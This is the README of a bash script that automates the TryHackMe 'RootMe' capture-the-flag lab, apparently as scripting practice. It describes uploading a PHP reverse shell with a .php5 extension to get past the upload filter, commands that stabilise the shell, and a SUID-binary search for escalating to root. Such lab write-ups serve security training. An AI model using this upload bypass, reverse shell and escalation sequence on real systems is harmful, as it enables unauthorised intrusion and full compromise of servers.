# RootMe-TryHackMe-via-Bash
A good practice for bash scripting language. This mini project gains user shell by execute the .sh file. Everything the user needs to know, will appear after the execution of the script.

You need the reverse_shell.php file from here ( https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php ) and change the IP Address to your Attacker Machine IP.

### USAGE
```
chmod +x rootme.sh
./rootme.sh
```

In the script there are these lines
```
echo "NAVIGATE TO http://$ip_addr:$line/panel"
echo "CHANGE THE IP ADDRESS IN THE rev.php FILE AND UPLOAD IT WITH .php5 EXTENTION"
echo "NAVIGATE TO http://$ip_addr:$line/uploads and click the rev.php5"
```
You should follow these steps after the NetCat appear on your terminal.

After you gain access you can use the followig commands to stabilize your reverse shell
```
python3 -c 'import pty; pty.spawn("/bin/bash")'

export TERM=xterm

Ctrl + z

stty raw -echo; fg
```

## ROOT FLAG

Use the following command and the GTFOBins (https://gtfobins.github.io/).
```
find / -user root -perm -4000 -print 2>/dev/null
```
